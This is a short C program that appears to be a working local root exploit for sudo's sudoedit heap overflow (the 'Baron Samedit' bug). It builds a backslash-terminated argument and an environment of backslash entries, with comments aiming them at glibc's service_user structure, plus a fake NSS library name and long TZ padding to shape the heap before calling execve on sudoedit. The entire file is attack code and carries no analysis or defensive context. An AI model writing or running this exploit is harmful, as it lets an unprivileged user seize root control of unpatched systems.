#include <unistd.h>
#include <string.h>

int main()
{
    char buf[130] = {0};
    memset(buf, 'A', 124);
    strcat(buf, "\\");


    char* argv[] = {
        "/usr/bin/sudoedit",
        "-s", 
	buf,
        0
    };


    char overflow[181] = {0};
    memset(overflow, 'B', 179);
    strcat(overflow, "\\");
    
    char tz[2948] = {"TZ="};
    memset(tz + strlen(tz), '0', 2944);

    char* envp[] = {
	overflow,
	"\\","\\","\\","\\","\\","\\","\\","\\", // service_user->library
      	"\\","\\","\\","\\","\\","\\","\\", // service_user->known
	"nyit/nyitoverflow", // service_user->name
	tz,
	0
    };

    execve("/usr/bin/sudoedit", argv, envp);
}
